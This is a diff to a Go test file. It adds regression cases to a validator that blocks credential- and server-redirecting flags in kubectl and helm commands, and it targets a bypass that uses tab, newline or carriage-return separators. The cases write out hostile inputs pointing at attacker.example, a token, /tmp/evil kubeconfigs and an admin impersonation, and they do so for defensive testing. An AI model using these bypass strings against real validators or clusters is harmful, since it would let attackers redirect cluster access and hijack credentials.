@@ -280,6 +280,17 @@ func TestValidateGlobalFlags(t *testing.T) {
 		{"helm -n flag allowed", "helm list -n default", CommandTypeHelm, false},
 		// cilium/hubble not affected
 		{"cilium with --server not blocked", "cilium status --server=evil", CommandTypeCilium, false},
+		// Whitespace bypass regression — shlex splits on tab/CR/LF in addition
+		// to space, so non-space separators must not slip past the substring scan.
+		{"kubectl --server <tab> blocked", "kubectl get pods --server\thttps://attacker.example:8443", CommandTypeKubectl, true},
+		{"kubectl --server <newline> blocked", "kubectl get pods --server\nhttps://attacker.example:8443", CommandTypeKubectl, true},
+		{"kubectl --server <cr> blocked", "kubectl get pods --server\rhttps://attacker.example:8443", CommandTypeKubectl, true},
+		{"kubectl --token <tab> blocked", "kubectl get pods --token\tabc123", CommandTypeKubectl, true},
+		{"kubectl --token <newline> blocked", "kubectl get pods --token\nabc123", CommandTypeKubectl, true},
+		{"kubectl --kubeconfig <tab> blocked", "kubectl get pods --kubeconfig\t/tmp/evil", CommandTypeKubectl, true},
+		{"kubectl --as <tab> blocked", "kubectl get pods --as\tadmin", CommandTypeKubectl, true},
+		{"helm --kube-apiserver <tab> blocked", "helm list --kube-apiserver\thttps://attacker.example:8443", CommandTypeHelm, true},
+		{"helm --kubeconfig <newline> blocked", "helm list --kubeconfig\n/tmp/evil", CommandTypeHelm, true},
 	}
 
 	for _, tc := range tests {
